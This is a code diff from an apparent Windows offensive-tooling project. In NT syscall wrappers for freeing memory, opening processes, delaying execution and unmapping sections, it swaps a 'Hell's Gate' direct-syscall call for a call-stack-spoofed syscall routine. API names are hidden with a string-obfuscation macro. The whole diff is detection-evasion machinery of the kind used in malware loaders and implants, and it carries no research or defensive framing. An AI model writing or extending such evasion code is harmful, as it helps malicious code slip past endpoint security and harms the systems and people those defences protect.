@@ -29,12 +29,11 @@ NTSTATUS NtAlloc(HANDLE hProc, PVOID *base, SIZE_T size, ULONG protect) {
 NTSTATUS NtFree(HANDLE hProc, PVOID base) {
     SIZE_T sz = 0;
     if (!HellsGateSetSSN(OBFSTR("NtFreeVirtualMemory"))) return (NTSTATUS)0xC0000001;
-    return HellsGateCall(
+    return SpoofedSyscall4(
         (PVOID)hProc,
         (PVOID)&base,
         (PVOID)&sz,
-        (PVOID)(ULONG_PTR)NT_MEM_RELEASE,
-        NULL, NULL, NULL, NULL
+        (PVOID)(ULONG_PTR)NT_MEM_RELEASE
     );
 }
 
@@ -101,12 +100,11 @@ NTSTATUS NtOpenProc(DWORD pid, DWORD access, HANDLE *hOut) {
     cid.UniqueThread  = NULL;
     ULONG_PTR hProc = 0;
     if (!HellsGateSetSSN(OBFSTR("NtOpenProcess"))) return (NTSTATUS)0xC0000001;
-    NTSTATUS st = HellsGateCall(
+    NTSTATUS st = SpoofedSyscall4(
         (PVOID)&hProc,
         (PVOID)(ULONG_PTR)access,
         (PVOID)&oa,
-        (PVOID)&cid,
-        NULL, NULL, NULL, NULL
+        (PVOID)&cid
     );
     if (hOut) *hOut = (HANDLE)hProc;
     return st;
@@ -120,10 +118,10 @@ NTSTATUS NtDelay(LONGLONG hundredNs) {
         Sleep((DWORD)(hundredNs / 10000));
         return STATUS_SUCCESS;
     }
-    return HellsGateCall(
+    return SpoofedSyscall4(
         (PVOID)(ULONG_PTR)FALSE,   /* Alertable */
         (PVOID)&interval,
-        NULL, NULL, NULL, NULL, NULL, NULL
+        NULL, NULL
     );
 }
 
@@ -219,9 +217,9 @@ NTSTATUS NtMapSection(HANDLE hFile, PVOID *baseOut, SIZE_T *viewSize) {
 /* ── NtUnmapViewOfSection ────────────────────────────────────────────────── */
 NTSTATUS NtUnmap(PVOID base) {
     if (!HellsGateSetSSN(OBFSTR("NtUnmapViewOfSection"))) return (NTSTATUS)0xC0000001;
-    return HellsGateCall(
+    return SpoofedSyscall4(
         (PVOID)(LONG_PTR)-1,
         base,
-        NULL, NULL, NULL, NULL, NULL, NULL
+        NULL, NULL
     );
 }
